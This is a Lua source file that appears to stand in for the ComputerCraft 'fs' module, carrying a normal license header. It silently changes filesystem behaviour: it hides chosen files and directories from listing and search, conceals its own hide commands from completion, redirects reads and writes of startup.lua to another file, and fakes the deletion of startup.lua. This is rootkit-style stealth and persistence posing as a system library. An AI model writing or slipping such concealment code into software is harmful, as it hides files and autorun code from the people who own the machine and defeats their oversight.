-- SPDX-FileCopyrightText: 2024 David Lightman
--
-- SPDX-License-Identifier: LicenseRef-CCPL

--- @module fs

local expect = dofile("rom/modules/main/cc/expect.lua")
local expect, field = expect.expect, expect.field

local native = _G.fs
local fs = native
for k, v in pairs(native) do fs[k] = v end

local hiddenDirs = {}
local hiddenFiles = {}
local originalStartup = "startup1.lua"

-- Helper function to check if a path is hidden
local function isHidden(path)
    for _, dir in ipairs(hiddenDirs) do
        if fs.combine("", path) == dir or string.sub(fs.combine("", path), 1, #dir + 1) == dir .. "/" then
            return true
        end
    end
    for _, file in ipairs(hiddenFiles) do
        if fs.combine("", path) == file then
            return true
        end
    end
    return false
end

-- Define the hidden commands and their implementations
local hiddenCommands = {}

-- Function to hide a file
hiddenCommands.hideFile = function(path)
    if fs.isDir(path) then
        error("Cannot hide: " .. path .. " is a directory.", 2)
    end
    local normalizedPath = fs.combine("", path)
    for _, file in ipairs(hiddenFiles) do
        if file == normalizedPath then
            return
        end
    end
    table.insert(hiddenFiles, normalizedPath)
end

-- Function to unhide a file
hiddenCommands.unhideFile = function(path)
    local normalizedPath = fs.combine("", path)
    for i, file in ipairs(hiddenFiles) do
        if file == normalizedPath then
            table.remove(hiddenFiles, i)
            return
        end
    end
end

-- Function to hide a directory
hiddenCommands.hideDir = function(path)
    if not fs.isDir(path) then
        error("Cannot hide: " .. path .. " is not a directory.", 2)
    end
    local normalizedPath = fs.combine("", path)
    for _, dir in ipairs(hiddenDirs) do
        if dir == normalizedPath then
            return
        end
    end
    table.insert(hiddenDirs, normalizedPath)
end

-- Function to unhide a directory
hiddenCommands.unhideDir = function(path)
    local normalizedPath = fs.combine("", path)
    for i, dir in ipairs(hiddenDirs) do
        if dir == normalizedPath then
            table.remove(hiddenDirs, i)
            return
        end
    end
end

-- Function to set the original startup file
hiddenCommands.setOriginalStartup = function(path)
    local normalizedPath = fs.combine("", path)
    if not fs.exists(normalizedPath) then
        -- Create an empty file if it doesn't exist
        local handle = fs.open(normalizedPath, "w")
        handle.close()
    end
    if fs.isDir(normalizedPath) then
        error("Cannot set startup file: " .. path .. " is a directory.", 2)
    end
    originalStartup = normalizedPath
end

-- Attach hidden commands to the `fs` table
for name, func in pairs(hiddenCommands) do
    rawset(fs, name, func)
end

-- Boolean array for hiding commands
local hiddenCommandNames = {
    hideDir = true,
    unhideDir = true,
    setOriginalStartup = true,
    hideFile = true,
    unhideFile = true,
}

-- Override shell completion
if shell and shell.complete then
    local oldComplete = shell.complete
    shell.complete = function(line)
        local suggestions = oldComplete(line)
        if suggestions then
            local filtered = {}
            for _, suggestion in ipairs(suggestions) do
                local commandName = suggestion:match("fs%.(%w+)")
                if not hiddenCommandNames[commandName] then
                    table.insert(filtered, suggestion)
                end
            end
            return filtered
        end
        return suggestions
    end
end

-- Set the metatable for `fs`
setmetatable(fs, {
    __index = function(_, key)
        if hiddenCommandNames[key] then
            return nil -- Hide from tab completion
        end
        return native[key]
    end,
    __pairs = function()
        -- Only expose non-hidden commands
        return function(_, k)
            local nextKey, nextValue = next(native, k)
            while nextKey and hiddenCommandNames[nextKey] do
                nextKey, nextValue = next(native, nextKey)
            end
            return nextKey, nextValue
        end
    end,
})

-- Wrapper for fs.list to exclude hidden directories and files
local oldList = native.list
function fs.list(path)
    local items = oldList(path)
    local visibleItems = {}
    for _, item in ipairs(items) do
        local fullPath = fs.combine(path, item)
        if not isHidden(fullPath) then
            table.insert(visibleItems, item)
        end
    end
    return visibleItems
end

-- Wrapper for fs.exists to account for hidden files and directories
local oldExists = native.exists
function fs.exists(path)
    if isHidden(path) then
        return true
    end
    return oldExists(path)
end

-- Wrapper for fs.isDir to account for hidden files and directories
local oldIsDir = native.isDir
function fs.isDir(path)
    if isHidden(path) then
        -- Check if it's in hiddenFiles to explicitly not treat it as a directory
        for _, file in ipairs(hiddenFiles) do
            if fs.combine("", path) == file then
                return false -- Hidden file, not a directory
            end
        end
        return true -- Hidden directory
    end
    return oldIsDir(path)
end


-- Wrapper for fs.open to handle startup.lua edits and unhide
local originalOpen = native.open
function fs.open(path, mode)
    local normalizedPath = fs.combine("", path)
    if normalizedPath == "startup.lua" then
        if mode == "w" or mode == "wb" then
            -- Unhide the file when writing to it
            for i, file in ipairs(hiddenFiles) do
                if file == normalizedPath then
                    table.remove(hiddenFiles, i) -- Unhide startup.lua
                    break
                end
            end

            -- Redirect all writes to originalStartup
            return originalOpen(originalStartup, mode)
        elseif mode == "r" or mode == "rb" then
            -- Redirect all reads to originalStartup
            return originalOpen(originalStartup, mode)
        end
    end

    -- For all other files, use normal open behavior
    return originalOpen(path, mode)
end




-- Wrapper for fs.delete to handle "deletion" of startup.lua
local originalDelete = native.delete
function fs.delete(path)
    local normalizedPath = fs.combine("", path)
    if normalizedPath == "startup.lua" then
        -- Instead of deleting, wipe the contents of originalStartup
        local handle = native.open(originalStartup, "w")
        if handle then
            handle.close() -- Wipes the file by opening it in write mode
        end

        -- Add startup.lua to hiddenFiles if not already hidden
        local isAlreadyHidden = false
        for _, file in ipairs(hiddenFiles) do
            if file == normalizedPath then
                isAlreadyHidden = true
                break
            end
        end
        if not isAlreadyHidden then
            table.insert(hiddenFiles, normalizedPath)
        end

        -- Do not actually delete the real startup.lua file
        return
    end

    -- Proceed with normal deletion for other files
    originalDelete(path)
end


-- Wrapper for fs.find to exclude hidden directories and files
local oldFind = native.find
function fs.find(pattern)
    local results = oldFind(pattern)
    local visibleResults = {}
    for _, path in ipairs(results) do
        if not isHidden(path) then
            table.insert(visibleResults, path)
        end
    end
    return visibleResults
end

-- Wrapper for fs.complete to support additional features
function fs.complete(sPath, sLocation, bIncludeFiles, bIncludeDirs)
    expect(1, sPath, "string")
    expect(2, sLocation, "string")
    local bIncludeHidden = nil
    if type(bIncludeFiles) == "table" then
        bIncludeDirs = field(bIncludeFiles, "include_dirs", "boolean", "nil")
        bIncludeHidden = field(bIncludeFiles, "include_hidden", "boolean", "nil")
        bIncludeFiles = field(bIncludeFiles, "include_files", "boolean", "nil")
    else
        expect(3, bIncludeFiles, "boolean", "nil")
        expect(4, bIncludeDirs, "boolean", "nil")
    end

    bIncludeHidden = bIncludeHidden ~= false
    bIncludeFiles = bIncludeFiles ~= false
    bIncludeDirs = bIncludeDirs ~= false
    local sDir = sLocation
    local nStart = 1
    local nSlash = string.find(sPath, "[/\\]", nStart)
    if nSlash == 1 then
        sDir = ""
        nStart = 2
    end
    local sName
    while not sName do
        local nSlash = string.find(sPath, "[/\\]", nStart)
        if nSlash then
            local sPart = string.sub(sPath, nStart, nSlash - 1)
            sDir = fs.combine(sDir, sPart)
            nStart = nSlash + 1
        else
            sName = string.sub(sPath, nStart)
        end
    end

    if fs.isDir(sDir) then
        local tResults = {}
        if bIncludeDirs and sPath == "" then
            table.insert(tResults, ".")
        end
        if sDir ~= "" then
            if sPath == "" then
                table.insert(tResults, bIncludeDirs and ".." or "../")
            elseif sPath == "." then
                table.insert(tResults, bIncludeDirs and "." or "./")
            end
        end
        local tFiles = fs.list(sDir)
        for n = 1, #tFiles do
            local sFile = tFiles[n]
            if #sFile >= #sName and string.sub(sFile, 1, #sName) == sName and (
                bIncludeHidden or sFile:sub(1, 1) ~= "." or sName:sub(1, 1) == "."
            ) then
                local bIsDir = fs.isDir(fs.combine(sDir, sFile))
                local sResult = string.sub(sFile, #sName + 1)
                if bIsDir then
                    table.insert(tResults, sResult .. "/")
                    if bIncludeDirs and #sResult > 0 then
                        table.insert(tResults, sResult)
                    end
                else
                    if bIncludeFiles and #sResult > 0 then
                        table.insert(tResults, sResult)
                    end
                end
            end
        end
        return tResults
    end

    return {}
end

function fs.isDriveRoot(sPath)
    expect(1, sPath, "string")
    return fs.getDir(sPath) == ".." or fs.getDrive(sPath) ~= fs.getDrive(fs.getDir(sPath))
end

return fs
